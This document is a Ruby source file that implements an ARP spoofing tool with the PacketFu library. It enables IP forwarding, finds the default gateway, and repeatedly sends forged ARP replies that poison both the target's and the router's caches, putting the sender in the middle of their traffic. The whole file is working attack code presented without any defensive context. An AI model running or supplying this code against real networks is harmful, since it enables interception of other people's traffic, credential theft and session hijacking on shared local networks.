#!/usr/bin/ruby

require 'rubygems'
require 'packetfu'

include PacketFu

class ArpSpoof

	# Enable IP forwarding
	`echo 1 > /proc/sys/net/ipv4/ip_forward`
	
	def initialize(config, targetsAddr, targetsMac, iface)
        @config = config
        @targetsAddr = targetsAddr
        @targetsMac = targetsMac
		@iface = iface
		@gateway = `ip route list`.match(/default.*/)[0].match(/\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?/)[0]
		@arping = true
	end

	def start
		# Construct the target's packet
		arp_packet_target = ARPPacket.new()
		arp_packet_target.eth_saddr = @config[:eth_saddr]       # sender's MAC address
		arp_packet_target.eth_daddr = @targetsMac      			# target's MAC address
		arp_packet_target.arp_saddr_mac = @config[:eth_saddr]   # sender's MAC address
		arp_packet_target.arp_daddr_mac = @targetsMac   		# target's MAC address
		arp_packet_target.arp_saddr_ip = @gateway        		# router's IP
		arp_packet_target.arp_daddr_ip = @targetsAddr         	# target's IP
		arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
		 
		# Construct the router's packet
		arp_packet_router = ARPPacket.new()
		arp_packet_router.eth_saddr = @config[:eth_saddr]       # sender's MAC address
		arp_packet_router.eth_daddr = @config[:eth_daddr]       # router's MAC address
		arp_packet_router.arp_saddr_mac = @config[:eth_saddr]   # sender's MAC address
		arp_packet_router.arp_daddr_mac = @config[:eth_daddr]   # router's MAC address
		arp_packet_router.arp_saddr_ip = @targetsAddr         	# target's IP
		arp_packet_router.arp_daddr_ip = @gateway        		# router's IP
		arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

		while (@arping)
			sleep 2
            arp_packet_target.to_w(@iface)
            arp_packet_router.to_w(@iface)
        end
	end

	def stop
		@arping = false
	end
end
